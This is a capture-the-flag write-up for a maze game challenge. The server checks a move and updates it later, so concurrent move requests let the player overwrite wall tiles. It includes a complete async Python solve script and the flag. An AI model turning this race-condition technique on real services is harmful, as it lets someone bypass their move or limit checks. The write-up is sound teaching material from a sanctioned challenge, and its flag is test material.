---
ai_date: '2025-04-27 05:18:13'
ai_summary: Race condition exploit by sending simultaneous move requests to overwrite
  wall tiles
ai_tags:
- race
- http-hdr
- rce
created: 2024-07-19T18:28
points: 100
solves: 100
updated: 2024-07-21T18:39
---

## race condition

The server fetched "possible moves", does some database manipulation, and updates possible moves at the end. There is a time frame in between where the player is still allowed to move in the direction of the wall.

It's a race condition challenge, by sending two or more requests to move at the same time we have a chance of smashing through the obstacle, effectively overwriting the wall with blank tiles.

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1721428085/2024/07/db612e22179b33fa758f1862f4bb4076.png)

My method is simple:
1. Send multiple move requests at once
2. If nothing changed, we are stuck, back away in the opposite direction.
3. Repeat until we reach the top right corner.
4. Rotate the response 90 degrees so we can run the exact same logic above again.

**caveat**, my method only works if the second row's last column is empty, because the vertical descend needs some space to initiate the first smash.

```
@..#...#..##...#.#..###..#..#..#.#.
.....#...#...##...#..#..###..#.#... <- this tile has to be empty
```

## solve script

```python
import asyncio
import aiohttp
import re
mid = "857c86f0-df2d-4f42-ad98-b766b2b1dc1b"
info = f"http://the-amazing-race.chal.imaginaryctf.org/{mid}"
target = f"http://the-amazing-race.chal.imaginaryctf.org/move?id={mid}&move="


async def move(session, direction, rot=0):
    response = await (session.post(url=target+direction) if len(direction) > 0 else session.get(url=info))
    if response.status != 200:
        print("huh", direction)
        return await move(session, direction, rot)
    resp = await response.read()
    resp = re.search("><code>\n([.@#\nF]+)\n</code>", resp.decode()).group(1)
    if rot == 1:
        resp = rotate_anticlockwise(resp)
    return resp

opp = {"right": "left", "left": "right", "up": "down", "down": "up"}
smash_dir = ["right", "down"]


def rotate_anticlockwise(text):
    lines = text.split('\n')
    return '\n'.join(''.join(line[-i-1] for line in lines) for i in range(len(lines[0])))


async def smash_right(session, rot=0):
    resp = await move(session, '', rot)
    lastResp = resp
    smashing_move = smash_dir[rot]
    backing_move = opp.get(smashing_move)
    while "@\n" not in resp and resp[-1] != '@':
        if lastResp == resp and not resp[0] == '@':  # got stuck
            resp = await move(session, backing_move, rot)
            print([x for x in resp.splitlines() if "@" in x], 'backing...', backing_move)
        lastResp = resp
        await asyncio.gather(*(move(session, smashing_move, rot) for _ in range(2)))
        resp = await move(session, '', rot)
        print([x for x in resp.splitlines() if "@" in x], 'smash!', smashing_move)


async def smasher():
    async with aiohttp.ClientSession() as session:
        await smash_right(session)
        print("reached top right most corner!")
        await smash_right(session, 1)
        print("reached flag")
        await move(session, "down")
        print(await (await session.get(url=info)).read())


asyncio.run(smasher())
```

```flag
ictf{turns_out_all_you_need_for_quantum_tunneling_is_to_be_f@st}
```